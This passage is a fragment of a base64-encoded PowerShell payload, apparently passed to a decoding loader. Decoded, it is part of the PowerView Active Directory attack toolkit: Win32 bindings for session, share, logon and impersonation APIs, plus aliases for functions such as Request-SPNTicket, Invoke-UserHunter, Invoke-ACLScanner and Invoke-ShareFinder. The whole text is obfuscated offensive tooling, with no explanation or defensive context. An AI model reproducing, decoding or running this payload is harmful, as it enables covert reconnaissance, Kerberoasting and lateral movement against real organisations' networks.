CAgICA9ICAgIDAKICAgIENvbm5lY3RlZCAgICA9ICAgIDEKICAgIENvbm5lY3RRdWVyeSA9ICAgIDIKICAgIFNoYWRvdyAgICAgICA9ICAgIDMKICAgIERpc2Nvbm5lY3RlZCA9ICAgIDQKICAgIElkbGUgICAgICAgICA9ICAgIDUKICAgIExpc3RlbiAgICAgICA9ICAgIDYKICAgIFJlc2V0ICAgICAgICA9ICAgIDcKICAgIERvd24gICAgICAgICA9ICAgIDgKICAgIEluaXQgICAgICAgICA9ICAgIDkKfQokV1RTX1NFU1NJT05fSU5GT18xID0gc3RydWN0ICRNb2QgUG93ZXJWaWV3LlJEUFNlc3Npb25JbmZvIEB7CiAgICBFeGVjRW52SWQgPSBmaWVsZCAwIFVJbnQzMgogICAgU3RhdGUgPSBmaWVsZCAxICRXVFNDb25uZWN0U3RhdGUKICAgIFNlc3Npb25JZCA9IGZpZWxkIDIgVUludDMyCiAgICBwU2Vzc2lvbk5hbWUgPSBmaWVsZCAzIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBwSG9zdE5hbWUgPSBmaWVsZCA0IFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBwVXNlck5hbWUgPSBmaWVsZCA1IFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBwRG9tYWluTmFtZSA9IGZpZWxkIDYgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIHBGYXJtTmFtZSA9IGZpZWxkIDcgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQokV1RTX0NMSUVOVF9BRERSRVNTID0gc3RydWN0ICRtb2QgV1RTX0NMSUVOVF9BRERSRVNTIEB7CiAgICBBZGRyZXNzRmFtaWx5ID0gZmllbGQgMCBVSW50MzIKICAgIEFkZHJlc3MgPSBmaWVsZCAxIEJ5dGVbXSAtTWFyc2hhbEFzIEAoJ0J5VmFsQXJyYXknLCAyMCkKfQokU0hBUkVfSU5GT18xID0gc3RydWN0ICRNb2QgUG93ZXJWaWV3LlNoYXJlSW5mbyBAewogICAgTmFtZSA9IGZpZWxkIDAgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIFR5cGUgPSBmaWVsZCAxIFVJbnQzMgogICAgUmVtYXJrID0gZmllbGQgMiBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQp9CiRXS1NUQV9VU0VSX0lORk9fMSA9IHN0cnVjdCAkTW9kIFBvd2VyVmlldy5Mb2dnZWRPblVzZXJJbmZvIEB7CiAgICBVc2VyTmFtZSA9IGZpZWxkIDAgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIExvZ29uRG9tYWluID0gZmllbGQgMSBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgQXV0aERvbWFpbnMgPSBmaWVsZCAyIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBMb2dvblNlcnZlciA9IGZpZWxkIDMgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQokU0VTU0lPTl9JTkZPXzEwID0gc3RydWN0ICRNb2QgUG93ZXJWaWV3LlNlc3Npb25JbmZvIEB7CiAgICBDTmFtZSA9IGZpZWxkIDAgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIFVzZXJOYW1lID0gZmllbGQgMSBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgVGltZSA9IGZpZWxkIDIgVUludDMyCiAgICBJZGxlVGltZSA9IGZpZWxkIDMgVUludDMyCn0KJFNJRF9OQU1FX1VTRSA9IHBzZW51bSAkTW9kIFNJRF9OQU1FX1VTRSBVSW50MTYgQHsKICAgIFNpZFR5cGVVc2VyICAgICAgICAgICAgID0gMQogICAgU2lkVHlwZUdyb3VwICAgICAgICAgICAgPSAyCiAgICBTaWRUeXBlRG9tYWluICAgICAgICAgICA9IDMKICAgIFNpZFR5cGVBbGlhcyAgICAgICAgICAgID0gNAogICAgU2lkVHlwZVdlbGxLbm93bkdyb3VwICAgPSA1CiAgICBTaWRUeXBlRGVsZXRlZEFjY291bnQgICA9IDYKICAgIFNpZFR5cGVJbnZhbGlkICAgICAgICAgID0gNwogICAgU2lkVHlwZVVua25vd24gICAgICAgICAgPSA4CiAgICBTaWRUeXBlQ29tcHV0ZXIgICAgICAgICA9IDkKfQokTE9DQUxHUk9VUF9JTkZPXzEgPSBzdHJ1Y3QgJE1vZCBMT0NBTEdST1VQX0lORk9fMSBAewogICAgbGdycGkxX25hbWUgPSBmaWVsZCAwIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBsZ3JwaTFfY29tbWVudCA9IGZpZWxkIDEgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQokTE9DQUxHUk9VUF9NRU1CRVJTX0lORk9fMiA9IHN0cnVjdCAkTW9kIExPQ0FMR1JPVVBfTUVNQkVSU19JTkZPXzIgQHsKICAgIGxncm1pMl9zaWQgPSBmaWVsZCAwIEludFB0cgogICAgbGdybWkyX3NpZHVzYWdlID0gZmllbGQgMSAkU0lEX05BTUVfVVNFCiAgICBsZ3JtaTJfZG9tYWluYW5kbmFtZSA9IGZpZWxkIDIgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQokRHNEb21haW5GbGFnID0gcHNlbnVtICRNb2QgRHNEb21haW4uRmxhZ3MgVUludDMyIEB7CiAgICBJTl9GT1JFU1QgICAgICAgPSAxCiAgICBESVJFQ1RfT1VUQk9VTkQgPSAyCiAgICBUUkVFX1JPT1QgICAgICAgPSA0CiAgICBQUklNQVJZICAgICAgICAgPSA4CiAgICBOQVRJVkVfTU9ERSAgICAgPSAxNgogICAgRElSRUNUX0lOQk9VTkQgID0gMzIKfSAtQml0ZmllbGQKJERzRG9tYWluVHJ1c3RUeXBlID0gcHNlbnVtICRNb2QgRHNEb21haW4uVHJ1c3RUeXBlIFVJbnQzMiBAewogICAgRE9XTkxFVkVMICAgPSAxCiAgICBVUExFVkVMICAgICA9IDIKICAgIE1JVCAgICAgICAgID0gMwogICAgRENFICAgICAgICAgPSA0Cn0KJERzRG9tYWluVHJ1c3RBdHRyaWJ1dGVzID0gcHNlbnVtICRNb2QgRHNEb21haW4uVHJ1c3RBdHRyaWJ1dGVzIFVJbnQzMiBAewogICAgTk9OX1RSQU5TSVRJVkUgICAgICA9IDEKICAgIFVQTEVWRUxfT05MWSAgICAgICAgPSAyCiAgICBGSUxURVJfU0lEUyAgICAgICAgID0gNAogICAgRk9SRVNUX1RSQU5TSVRJVkUgICA9IDgKICAgIENST1NTX09SR0FOSVpBVElPTiAgPSAxNgogICAgV0lUSElOX0ZPUkVTVCAgICAgICA9IDMyCiAgICBUUkVBVF9BU19FWFRFUk5BTCAgID0gNjQKfQokRFNfRE9NQUlOX1RSVVNUUyA9IHN0cnVjdCAkTW9kIERTX0RPTUFJTl9UUlVTVFMgQHsKICAgIE5ldGJpb3NEb21haW5OYW1lID0gZmllbGQgMCBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgRG5zRG9tYWluTmFtZSA9IGZpZWxkIDEgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIEZsYWdzID0gZmllbGQgMiAkRHNEb21haW5GbGFnCiAgICBQYXJlbnRJbmRleCA9IGZpZWxkIDMgVUludDMyCiAgICBUcnVzdFR5cGUgPSBmaWVsZCA0ICREc0RvbWFpblRydXN0VHlwZQogICAgVHJ1c3RBdHRyaWJ1dGVzID0gZmllbGQgNSAkRHNEb21haW5UcnVzdEF0dHJpYnV0ZXMKICAgIERvbWFpblNpZCA9IGZpZWxkIDYgSW50UHRyCiAgICBEb21haW5HdWlkID0gZmllbGQgNyBHdWlkCn0KJE5FVFJFU09VUkNFVyA9IHN0cnVjdCAkTW9kIE5FVFJFU09VUkNFVyBAewogICAgZHdTY29wZSA9ICAgICAgICAgZmllbGQgMCBVSW50MzIKICAgIGR3VHlwZSA9ICAgICAgICAgIGZpZWxkIDEgVUludDMyCiAgICBkd0Rpc3BsYXlUeXBlID0gICBmaWVsZCAyIFVJbnQzMgogICAgZHdVc2FnZSA9ICAgICAgICAgZmllbGQgMyBVSW50MzIKICAgIGxwTG9jYWxOYW1lID0gICAgIGZpZWxkIDQgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIGxwUmVtb3RlTmFtZSA9ICAgIGZpZWxkIDUgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIGxwQ29tbWVudCA9ICAgICAgIGZpZWxkIDYgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIGxwUHJvdmlkZXIgPSAgICAgIGZpZWxkIDcgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQokRnVuY3Rpb25EZWZpbml0aW9ucyA9IEAoCiAgICAoZnVuYyBuZXRhcGkzMiBOZXRTaGFyZUVudW0gKFtJbnRdKSBAKFtTdHJpbmddLCBbSW50XSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50XSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkpLAogICAgKGZ1bmMgbmV0YXBpMzIgTmV0V2tzdGFVc2VyRW51bSAoW0ludF0pIEAoW1N0cmluZ10sIFtJbnRdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRdLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSksCiAgICAoZnVuYyBuZXRhcGkzMiBOZXRTZXNzaW9uRW51bSAoW0ludF0pIEAoW1N0cmluZ10sIFtTdHJpbmddLCBbU3RyaW5nXSwgW0ludF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludF0sIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpKSwKICAgIChmdW5jIG5ldGFwaTMyIE5ldExvY2FsR3JvdXBFbnVtIChbSW50XSkgQChbU3RyaW5nXSwgW0ludF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludF0sIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpKSwKICAgIChmdW5jIG5ldGFwaTMyIE5ldExvY2FsR3JvdXBHZXRNZW1iZXJzIChbSW50XSkgQChbU3RyaW5nXSwgW1N0cmluZ10sIFtJbnRdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRdLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSksCiAgICAoZnVuYyBuZXRhcGkzMiBEc0dldFNpdGVOYW1lIChbSW50XSkgQChbU3RyaW5nXSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSksCiAgICAoZnVuYyBuZXRhcGkzMiBEc0VudW1lcmF0ZURvbWFpblRydXN0cyAoW0ludF0pIEAoW1N0cmluZ10sIFtVSW50MzJdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkpLAogICAgKGZ1bmMgbmV0YXBpMzIgTmV0QXBpQnVmZmVyRnJlZSAoW0ludF0pIEAoW0ludFB0cl0pKSwKICAgIChmdW5jIGFkdmFwaTMyIENvbnZlcnRTaWRUb1N0cmluZ1NpZCAoW0ludF0pIEAoW0ludFB0cl0sIFtTdHJpbmddLk1ha2VCeVJlZlR5cGUoKSkgLVNldExhc3RFcnJvciksCiAgICAoZnVuYyBhZHZhcGkzMiBPcGVuU0NNYW5hZ2VyVyAoW0ludFB0cl0pIEAoW1N0cmluZ10sIFtTdHJpbmddLCBbSW50XSkgLVNldExhc3RFcnJvciksCiAgICAoZnVuYyBhZHZhcGkzMiBDbG9zZVNlcnZpY2VIYW5kbGUgKFtJbnRdKSBAKFtJbnRQdHJdKSksCiAgICAoZnVuYyBhZHZhcGkzMiBMb2dvblVzZXIgKFtCb29sXSkgQChbU3RyaW5nXSwgW1N0cmluZ10sIFtTdHJpbmddLCBbVUludDMyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgLVNldExhc3RFcnJvciksCiAgICAoZnVuYyBhZHZhcGkzMiBJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlciAoW0Jvb2xdKSBAKFtJbnRQdHJdKSAtU2V0TGFzdEVycm9yKSwKICAgIChmdW5jIGFkdmFwaTMyIFJldmVydFRvU2VsZiAoW0Jvb2xdKSBAKCkgLVNldExhc3RFcnJvciksCiAgICAoZnVuYyB3dHNhcGkzMiBXVFNPcGVuU2VydmVyRXggKFtJbnRQdHJdKSBAKFtTdHJpbmddKSksCiAgICAoZnVuYyB3dHNhcGkzMiBXVFNFbnVtZXJhdGVTZXNzaW9uc0V4IChbSW50XSkgQChbSW50UHRyXSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAtU2V0TGFzdEVycm9yKSwKICAgIChmdW5jIHd0c2FwaTMyIFdUU1F1ZXJ5U2Vzc2lvbkluZm9ybWF0aW9uIChbSW50XSkgQChbSW50UHRyXSwgW0ludF0sIFtJbnRdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAtU2V0TGFzdEVycm9yKSwKICAgIChmdW5jIHd0c2FwaTMyIFdUU0ZyZWVNZW1vcnlFeCAoW0ludF0pIEAoW0ludDMyXSwgW0ludFB0cl0sIFtJbnQzMl0pKSwKICAgIChmdW5jIHd0c2FwaTMyIFdUU0ZyZWVNZW1vcnkgKFtJbnRdKSBAKFtJbnRQdHJdKSksCiAgICAoZnVuYyB3dHNhcGkzMiBXVFNDbG9zZVNlcnZlciAoW0ludF0pIEAoW0ludFB0cl0pKSwKICAgIChmdW5jIE1wciBXTmV0QWRkQ29ubmVjdGlvbjJXIChbSW50XSkgQCgkTkVUUkVTT1VSQ0VXLCBbU3RyaW5nXSwgW1N0cmluZ10sIFtVSW50MzJdKSksCiAgICAoZnVuYyBNcHIgV05ldENhbmNlbENvbm5lY3Rpb24yIChbSW50XSkgQChbU3RyaW5nXSwgW0ludF0sIFtCb29sXSkpLAogICAgKGZ1bmMga2VybmVsMzIgQ2xvc2VIYW5kbGUgKFtCb29sXSkgQChbSW50UHRyXSkgLVNldExhc3RFcnJvcikKKQokVHlwZXMgPSAkRnVuY3Rpb25EZWZpbml0aW9ucyB8IEFkZC1XaW4zMlR5cGUgLU1vZHVsZSAkTW9kIC1OYW1lc3BhY2UgJ1dpbjMyJwokTmV0YXBpMzIgPSAkVHlwZXNbJ25ldGFwaTMyJ10KJEFkdmFwaTMyID0gJFR5cGVzWydhZHZhcGkzMiddCiRXdHNhcGkzMiA9ICRUeXBlc1snd3RzYXBpMzInXQokTXByID0gJFR5cGVzWydNcHInXQokS2VybmVsMzIgPSAkVHlwZXNbJ2tlcm5lbDMyJ10KU2V0LUFsaWFzIEdldC1JUEFkZHJlc3MgUmVzb2x2ZS1JUEFkZHJlc3MKU2V0LUFsaWFzIENvbnZlcnQtTmFtZVRvU2lkIENvbnZlcnRUby1TSUQKU2V0LUFsaWFzIENvbnZlcnQtU2lkVG9OYW1lIENvbnZlcnRGcm9tLVNJRApTZXQtQWxpYXMgUmVxdWVzdC1TUE5UaWNrZXQgR2V0LURvbWFpblNQTlRpY2tldApTZXQtQWxpYXMgR2V0LUROU1pvbmUgR2V0LURvbWFpbkROU1pvbmUKU2V0LUFsaWFzIEdldC1ETlNSZWNvcmQgR2V0LURvbWFpbkROU1JlY29yZApTZXQtQWxpYXMgR2V0LU5ldERvbWFpbiBHZXQtRG9tYWluClNldC1BbGlhcyBHZXQtTmV0RG9tYWluQ29udHJvbGxlciBHZXQtRG9tYWluQ29udHJvbGxlcgpTZXQtQWxpYXMgR2V0LU5ldEZvcmVzdCBHZXQtRm9yZXN0ClNldC1BbGlhcyBHZXQtTmV0Rm9yZXN0RG9tYWluIEdldC1Gb3Jlc3REb21haW4KU2V0LUFsaWFzIEdldC1OZXRGb3Jlc3RDYXRhbG9nIEdldC1Gb3Jlc3RHbG9iYWxDYXRhbG9nClNldC1BbGlhcyBHZXQtTmV0VXNlciBHZXQtRG9tYWluVXNlcgpTZXQtQWxpYXMgR2V0LVVzZXJFdmVudCBHZXQtRG9tYWluVXNlckV2ZW50ClNldC1BbGlhcyBHZXQtTmV0Q29tcHV0ZXIgR2V0LURvbWFpbkNvbXB1dGVyClNldC1BbGlhcyBHZXQtQURPYmplY3QgR2V0LURvbWFpbk9iamVjdApTZXQtQWxpYXMgU2V0LUFET2JqZWN0IFNldC1Eb21haW5PYmplY3QKU2V0LUFsaWFzIEdldC1PYmplY3RBY2wgR2V0LURvbWFpbk9iamVjdEFjbApTZXQtQWxpYXMgQWRkLU9iamVjdEFjbCBBZGQtRG9tYWluT2JqZWN0QWNsClNldC1BbGlhcyBJbnZva2UtQUNMU2Nhbm5lciBGaW5kLUludGVyZXN0aW5nRG9tYWluQWNsClNldC1BbGlhcyBHZXQtR1VJRE1hcCBHZXQtRG9tYWluR1VJRE1hcApTZXQtQWxpYXMgR2V0LU5ldE9VIEdldC1Eb21haW5PVQpTZXQtQWxpYXMgR2V0LU5ldFNpdGUgR2V0LURvbWFpblNpdGUKU2V0LUFsaWFzIEdldC1OZXRTdWJuZXQgR2V0LURvbWFpblN1Ym5ldApTZXQtQWxpYXMgR2V0LU5ldEdyb3VwIEdldC1Eb21haW5Hcm91cApTZXQtQWxpYXMgRmluZC1NYW5hZ2VkU2VjdXJpdHlHcm91cHMgR2V0LURvbWFpbk1hbmFnZWRTZWN1cml0eUdyb3VwClNldC1BbGlhcyBHZXQtTmV0R3JvdXBNZW1iZXIgR2V0LURvbWFpbkdyb3VwTWVtYmVyClNldC1BbGlhcyBHZXQtTmV0RmlsZVNlcnZlciBHZXQtRG9tYWluRmlsZVNlcnZlcgpTZXQtQWxpYXMgR2V0LURGU3NoYXJlIEdldC1Eb21haW5ERlNTaGFyZQpTZXQtQWxpYXMgR2V0LU5ldEdQTyBHZXQtRG9tYWluR1BPClNldC1BbGlhcyBHZXQtTmV0R1BPR3JvdXAgR2V0LURvbWFpbkdQT0xvY2FsR3JvdXAKU2V0LUFsaWFzIEZpbmQtR1BPTG9jYXRpb24gR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZwpTZXQtQWxpYXMgRmluZC1HUE9Db21wdXRlckFkbWluIEdldC1Eb21haW5HUE9Db21wdXRlckxvY2FsR3JvdXBNYXBwaW5nClNldC1BbGlhcyBHZXQtTG9nZ2VkT25Mb2NhbCBHZXQtUmVnTG9nZ2VkT24KU2V0LUFsaWFzIEludm9rZS1DaGVja0xvY2FsQWRtaW5BY2Nlc3MgVGVzdC1BZG1pbkFjY2VzcwpTZXQtQWxpYXMgR2V0LVNpdGVOYW1lIEdldC1OZXRDb21wdXRlclNpdGVOYW1lClNldC1BbGlhcyBHZXQtUHJveHkgR2V0LVdNSVJlZ1Byb3h5ClNldC1BbGlhcyBHZXQtTGFzdExvZ2dlZE9uIEdldC1XTUlSZWdMYXN0TG9nZ2VkT24KU2V0LUFsaWFzIEdldC1DYWNoZWRSRFBDb25uZWN0aW9uIEdldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uClNldC1BbGlhcyBHZXQtUmVnaXN0cnlNb3VudGVkRHJpdmUgR2V0LVdNSVJlZ01vdW50ZWREcml2ZQpTZXQtQWxpYXMgR2V0LU5ldFByb2Nlc3MgR2V0LVdNSVByb2Nlc3MKU2V0LUFsaWFzIEludm9rZS1UaHJlYWRlZEZ1bmN0aW9uIE5ldy1UaHJlYWRlZEZ1bmN0aW9uClNldC1BbGlhcyBJbnZva2UtVXNlckh1bnRlciBGaW5kLURvbWFpblVzZXJMb2NhdGlvbgpTZXQtQWxpYXMgSW52b2tlLVByb2Nlc3NIdW50ZXIgRmluZC1Eb21haW5Qcm9jZXNzClNldC1BbGlhcyBJbnZva2UtRXZlbnRIdW50ZXIgRmluZC1Eb21haW5Vc2VyRXZlbnQKU2V0LUFsaWFzIEludm9rZS1TaGFyZUZpbmRlciBGaW5kLURvbWFpblNoYXJlClNldC1BbGlhcyBJbnZva2UtRmlsZUZpbmRlciBGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlClNldC1BbGlhcyBJbnZva2UtRW51bWVyYXRlTG9jYWxBZG1pbiBGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXIKU2V0LUFsaWFzIEdldC1OZXREb21haW5UcnVzdCBHZXQtRG9tYWluVHJ1c3QKU2V0LUFsaWFzIEdldC1OZXRGb3Jlc3RUcnVzdCBHZXQtRm9yZXN0VHJ1c3QKU2V0LUFsaWFzIEZpbmQtRm9yZWlnblVzZXIgR2V0LURvbWFpbkZvcmVpZ25Vc2VyClNldC1BbGlhcyBGaW5kLUZvcmVpZ25Hcm91cCBHZXQtRG9tYWluRm9yZWlnbkdyb3VwTWVtYmVyClNldC1BbGlhcyBJbnZva2UtTWFwRG9tYWluVHJ1c3QgR2V0LURvbWFpblRydXN0TWFwcGluZwpTZXQtQWxpYXMgR2V0LURvbWFpblBvbGljeSBHZXQtRG9tYWluUG9saWN5RGF0YQo=")))

